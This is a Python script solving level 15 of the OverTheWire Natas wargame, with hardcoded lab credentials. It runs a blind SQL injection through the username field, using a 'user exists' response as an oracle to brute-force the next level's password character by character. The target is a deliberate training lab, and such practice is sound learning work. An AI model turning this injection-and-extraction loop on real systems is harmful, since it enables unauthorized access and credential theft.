# Python script for natas 15
# Goes through 32 characters that are either ASCII characters (capital and minor) and numerals 0-9
# Finds out if a char returns a true value and adds it into the known password
# Returns password for level 16.

import string
import requests

url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
auth = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
characters = string.ascii_letters+string.digits
password = ""

def test_char(position, char, current_psw):
    payload = {
        "username" : f'natas16" AND BINARY substring(password, 1, {position})= "{current_psw + char}" -- '
    }
    response = requests.post(url, data=payload, auth=auth)
    # True if
    return "This user exists." in response.text


for position in range(1,33):
    for char in characters:
        if test_char(position, char, password):
            print(char)
            password += char
            break

